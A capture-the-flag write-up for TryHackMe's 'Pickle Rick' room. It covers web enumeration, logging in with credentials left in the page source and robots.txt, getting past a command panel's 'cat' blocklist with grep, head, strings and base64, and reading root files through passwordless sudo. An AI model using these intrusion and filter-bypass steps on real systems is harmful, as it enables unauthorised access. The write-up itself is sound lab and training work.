# Pickle Rick — TryHackMe

**Platform:** TryHackMe · **Difficulty:** Easy · **Date:** 2026-11-21

## Summary
A web box themed on Rick and Morty. Rick has turned himself into a pickle and needs three secret ingredients to turn back. The whole room runs through port 80: a username is hidden in the homepage source, the password sits in `robots.txt`, and an authenticated command panel gives remote code execution as the web user. `sudo -l` shows `NOPASSWD: ALL`, so all three ingredients are readable — two as the web user, the third in `/root` via sudo.

## Enumeration
Scan the box — only SSH and HTTP are open, so the attack surface is the website.

```
nmap -sV TARGET
```
- 22/tcp  ssh
- 80/tcp  http

Read the homepage source — Rick left the username in an HTML comment.

```
curl -s http://TARGET/
```
→ `Username: R1ckRul3s`

Check `robots.txt` — the password is sitting in it.

```
curl -s http://TARGET/robots.txt
```
→ `Wubbalubbadubdub`

Brute the web directories to find the login page.

```
gobuster dir -u http://TARGET/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php
```
→ `/login.php`

## Foothold
Log in at `http://TARGET/login.php` with `R1ckRul3s` / `Wubbalubbadubdub`. The portal is a command panel that executes shell commands on the box as the web user — instant RCE.

`cat` is blocked on this box ("Command disabled"), so files are read with `grep .`, which prints every non-empty line of a file and isn't on the blocklist.

**Ingredient 1** — in the web root:
```
ls
grep . Sup3rS3cretPickl3Ingred.txt
```

**Ingredient 2** — in Rick's home directory; the filename has a space, so it must be quoted:
```
ls /home/rick
grep . '/home/rick/second ingredients'
```

## Privilege escalation
The web user has full passwordless sudo:
```
sudo -l
```
→ `(ALL) NOPASSWD: ALL`

**Ingredient 3** — in `/root`, read with sudo:
```
sudo ls /root
sudo grep . /root/3rd.txt
```

## Payloads & code
No exploit code needed — the whole room is enumeration plus a disabled-command bypass. The one technique worth keeping is reading files when `cat` is blocked:

```
# cat is blocked; grep . prints every non-empty line = whole file
grep . <file>

# sudo for root-owned files once sudo -l shows NOPASSWD: ALL
sudo grep . /root/<file>

# quote filenames containing spaces so the shell treats them as one argument
grep . '/home/rick/second ingredients'
```

Other read bypasses that work the same way when `cat` is filtered: `head`, `tail`, `more`, `less`, `nl`, `strings`, `base64 <file>` (then decode).

## Flags / Answers
- First ingredient: `REDACTED`
- Second ingredient: `REDACTED`
- Third ingredient: `REDACTED`

## Lessons
- When a command panel blocks `cat`, don't stop — `grep .`, `head`, `tail`, `nl` and `strings` all read a file just as well.
- Always run `sudo -l` the moment you have a shell. `NOPASSWD: ALL` turns privilege escalation into a single `sudo` prefix.
- Filenames with spaces need quoting or the shell splits them into separate arguments and the read fails.
